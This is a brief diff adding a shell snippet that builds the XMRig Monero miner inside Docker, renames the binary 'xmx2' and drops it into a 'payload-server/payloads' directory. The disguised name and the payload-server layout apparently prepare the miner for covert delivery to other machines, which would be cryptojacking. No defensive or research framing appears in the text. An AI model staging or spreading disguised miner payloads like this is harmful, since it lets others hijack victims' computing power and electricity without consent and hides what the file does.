@@ -1,0 +1,7 @@
+# This command will take a few minutes to run. When it's finished, you will have a new, real xmx2 binary inside your payload-server/payloads/ directory.
+docker --context desktop-linux run --rm -v "$(pwd)/payload-server/payloads":/output ubuntu:20.04 sh -c "\
+    apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && \
+    git clone https://github.com/xmrig/xmrig.git && \
+    mkdir xmrig/build && cd xmrig/build && \
+    cmake .. && make -j\$(nproc) && \
+    cp xmrig /output/xmx2"
